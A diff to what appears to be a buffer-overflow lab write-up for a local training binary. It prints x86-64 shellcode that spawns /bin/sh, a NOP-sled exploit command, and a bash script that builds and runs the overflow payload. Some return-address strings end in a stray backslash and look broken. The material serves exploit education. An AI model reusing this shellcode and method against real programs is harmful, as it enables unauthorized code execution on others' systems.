@@ -1433,9 +1433,55 @@ We can verify with a ![Hex Calculator](https://www.rapidtables.com/calc/math/hex
 
 ![Buffer Runtime Address](assets/buffer-overflow-18-task8-7.png)  
 
-After translation from big-endian to little-endian our return address can start at `\xe0\xe2\xff\xff\xff\x7f\x00\x00`
+After translation from big-endian to little-endian our return address can start at `\xe0\xe2\xff\xff\xff\x7f\`
 
 
 The attack command, then can become:  
 
 `:> ./buffer-overflow $(python -c "print('\x90'*109 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\xe0\xe2\xff\xff\xff\x7f\x00\x00')")`
+
+![OOPS](assets/buffer-overflow-19-task8-8.png)
+
+This command doesn't work. It doesn't account for alignment bytes, base pointer, or stack pointer addresses which, by convention, would be included. 
+We can change the command and automate it in a single step in an attempt to reduce our effort.  
+
+The original math indicated `ret` would be overwritten at 149 bytes. This turned out to be too high as the segmentation error was indicated at 144 bytes.  
+
+returning to, and adjusting, the model above:  
+```md
+[140-byte buffer][alignment padding (4 bytes?)][8-byte rbp][8-byte rsp][6-byte return address]
+```
+
+Experiment with a bash script:  
+
+#!/bin/bash
+
+# This script prepares and executes a buffer overflow command using specific values
+# defined by the user for educational and ethical testing purposes only.
+
+# Prompt user for the number of NOPs
+echo "Please enter the number of NOPs:"
+read USER_NUM_NOPS
+
+# Validate input is a number (basic check)
+if ! [[ "$USER_NUM_NOPS" =~ ^[0-9]+$ ]]; then
+    echo "Error: Invalid number provided. Exiting."
+    exit 1
+fi
+
+NUM_NOPS=$USER_NUM_NOPS
+echo "Using $NUM_NOPS NOPs"
+
+S_CODE='\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'
+NUM_JUNK=12
+# adjust the return address to ensure the return lands within the NOPS
+RET_OVER='\x88\xe2\xff\xff\xff\x7f\'
+
+# The command constructs the full payload using a Python 2 one-liner to generate the string.
+# Note the use of "print" instead of "print()".
+# The resulting string is passed as an argument to the './buffer-overflow' executable.
+# Ensure you have compiled the C code first using "gcc buffer-overflow.c -o buffer-overflow" and disabled security features like ASLR if needed.
+./buffer-overflow $(python -c "print '\x90'*$NUM_NOPS + '$S_CODE' + '\x90'*$NUM_JUNK + '$RET_OVER'")
+
+where NUM_NOPS is expected to be 112
+
